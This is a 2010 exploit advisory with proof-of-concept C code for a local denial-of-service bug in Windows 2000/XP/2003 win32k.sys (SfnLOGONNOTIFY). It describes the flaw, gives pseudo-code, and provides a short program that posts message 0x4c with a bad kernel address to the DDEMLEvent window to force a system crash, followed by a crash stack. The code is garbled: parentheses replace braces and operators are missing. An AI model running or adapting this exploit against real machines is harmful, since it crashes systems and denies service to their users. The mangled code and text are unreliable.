/*
Windows 2000/XP/2003 win32k.sys SfnLOGONNOTIFY local kernel Denial of Service Vulnerability 

Effect : Microsoft Windows 2000/XP/2003 full patch 


Author:MJ0011
Published: 2010-04-22


Vulnerability Details: 

Win32k.sys in DispatchMessage when the last call to xxxDefWindowProc, this function in dealing with some 
Message, will call gapfnScSendMessage this function table function to process, which under the deal 2000/xp/2003 
0x4c No. message, there will be a function called SfnLOGONNOTIFY, this function again when the wParam == 4/13/12 
When the data directly from the lParam inside out, despite the use of the function of the SEH, but as long as the kernel passes the wrong address, will still lead to 
BSOD 

Pseudo-code: 

if (wParam == 4 | | wParam == 13 | | wParam == 12) 
( 
    v18 = * (_DWORD *) lParam; 
    v19 = * (_DWORD *) (lParam 4); 
    v20 = * (_DWORD *) (lParam 8); 
    v21 = * (_DWORD *) (lParam 12); 
*/

//Exploit code: 

# Include "stdafx.h" 
# Include "windows.h" 
int main (int argc, char * argv []) 
( 
printf("Microsoft Windows Win32k.sys SfnLOGONNOTIFY Local D.O.S Vuln\nBy MJ0011\nth_decoder@126.com\nPressEnter");

getchar();

HWND hwnd = FindWindow ("DDEMLEvent", NULL); 

if (hwnd == 0) 
( 
   printf ("cannot find DDEMLEvent Window! \ n"); 
   return 0; 
) 

PostMessage (hwnd, 0x4c, 0x4, 0x80000000); 


return 0; 
) 

Common crash stack: 

kd> kc 

win32k! SfnLOGONNOTIFY 
win32k! xxxDefWindowProc 
win32k! xxxEventWndProc 
win32k! xxxDispatchMessage 
win32k! NtUserDispatchMessage 
/*
.... 

Windows 7/Vista no such problem 

Thanks: 

Thanks to my colleagues LYL to help me discovered this vulnerability 



th_decoder
2010-04-22
*/